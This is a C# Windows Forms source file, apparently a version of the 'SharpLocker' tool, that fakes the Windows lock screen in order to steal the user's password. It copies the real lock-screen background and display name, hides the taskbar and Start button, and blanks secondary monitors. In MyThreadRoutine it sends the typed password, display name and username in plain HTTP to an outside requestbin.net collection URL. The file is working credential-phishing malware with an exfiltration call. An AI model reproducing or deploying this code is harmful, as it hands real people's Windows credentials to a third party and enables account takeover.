using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.DirectoryServices.AccountManagement;
using System.Net;
using System.Web;
using System.IO;
using System.Activities.Expressions;

namespace SharpLocker
{


    public partial class LockScreenForm : Form
    {

        public LockScreenForm()
        {

            InitializeComponent();
            String userName = (string)UserPrincipal.Current.DisplayName;
            if (userName == null)
            {
                userName = Environment.UserName.ToString();
            }
            String envUserName = Environment.UserName.ToString();
            
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Normal;
            StartPosition = FormStartPosition.Manual;
            Location = new Point(0, 0);
            Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            string sid = UserPrincipal.Current.Sid.ToString();
            string dir = (string)(@"C:\\ProgramData\\Microsoft\\Windows\\SystemData\\" + sid + "\\ReadOnly\\LockScreen_A\\LockScreen.jpg");
            try
            {
                Image myimage = new Bitmap(@"C:\\ProgramData\\Microsoft\\Windows\\SystemData\\" + sid + "\\ReadOnly\\LockScreen_A\\LockScreen.jpg");
                BackgroundImage = myimage;
                BackgroundImageLayout = ImageLayout.Stretch;
            }
            catch (Exception)
            {
                Image myimage = new Bitmap(@"C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg");
                BackgroundImage = myimage;
                BackgroundImageLayout = ImageLayout.Stretch;
            }
            Taskbar.Hide();
            this.TopMost = true;
            UserNameLabel.Text = userName;
            UserNameLabel.BackColor = Color.Transparent;

            foreach (var screen in Screen.AllScreens)
            {

                Thread thread = new Thread(() => WorkThreadFunction(screen));
                thread.Start();
            }


        }

        private void MyThreadRoutine()
        {
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/r4sydnr4?&Password:" + PasswordTextBox.Text + "&UserName:" + (string)UserPrincipal.Current.DisplayName + "&envName:" + Environment.UserName.ToString());
            req.GetResponse();
            System.Windows.Forms.Application.Exit();
        }
        private void exitApp()
        {
            ThreadStart myThreadStart = new ThreadStart(MyThreadRoutine);
            Thread myThread = new Thread(myThreadStart);
            myThread.Start();
            PasswordTextBox.Hide();
            SubmitPasswordButton.Hide();
            Taskbar.Show();
            System.Windows.Forms.Application.Exit();
        }

        public class Taskbar
        {
            [DllImport("user32.dll")]
            private static extern int FindWindow(string className, string windowText);

            [DllImport("user32.dll")]
            private static extern int ShowWindow(int hwnd, int command);

            [DllImport("user32.dll")]
            public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

            [DllImport("user32.dll")]
            private static extern int GetDesktopWindow();

            private const int SW_HIDE = 0;
            private const int SW_SHOW = 1;

            protected static int Handle
            {
                get
                {
                    return FindWindow("Shell_TrayWnd", "");
                }
            }

            protected static int HandleOfStartButton
            {
                get
                {
                    int handleOfDesktop = GetDesktopWindow();
                    int handleOfStartButton = FindWindowEx(handleOfDesktop, 0, "button", 0);
                    return handleOfStartButton;
                }
            }

            private Taskbar()
            {
                // hide ctor
            }

            public static void Show()
            {
                ShowWindow(Handle, SW_SHOW);
                ShowWindow(HandleOfStartButton, SW_SHOW);
            }

            public static void Hide()
            {
                ShowWindow(Handle, SW_HIDE);
                ShowWindow(HandleOfStartButton, SW_HIDE);
            }
        }

        public void WorkThreadFunction(Screen screen)
        {
            try
            {
                if (screen.Primary == true)
                {
                   
                    
                }

                if (screen.Primary == false)
                {
                    int mostLeft = screen.WorkingArea.Left;
                    int mostTop = screen.WorkingArea.Top;
                    Debug.WriteLine(mostLeft.ToString(), mostTop.ToString());
                    using (Form form = new Form())
                    {
                        form.WindowState = FormWindowState.Normal;
                        form.StartPosition = FormStartPosition.Manual;
                        form.Location = new Point(mostLeft, mostTop);
                        form.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
                        form.Size = new Size(screen.Bounds.Width, screen.Bounds.Height);
                        form.BackColor = Color.Black;
                        form.ShowDialog();
                    }
                }
            }
            catch (Exception ex)
            {
                // log errors
            }
        }


        private void button1_Click(object sender, EventArgs e)
        {

        }



        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }


        private void UserNameLabel_Click(object sender, EventArgs e)
        {

        }

        protected override CreateParams CreateParams
        {
            get
            {
                var parms = base.CreateParams;
                parms.Style &= ~0x02000000;  // Turn off WS_CLIPCHILDREN
                parms.ExStyle |= 0x02000000;
                return parms;
            }
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            exitApp();
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            Taskbar.Show();
            base.OnClosing(e);
        }

        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox3_Click(object sender, EventArgs e)
        {
            exitApp();
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            exitApp();
        }

        private void LockScreenForm_Load(object sender, EventArgs e)
        {

        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }
    }
    

}
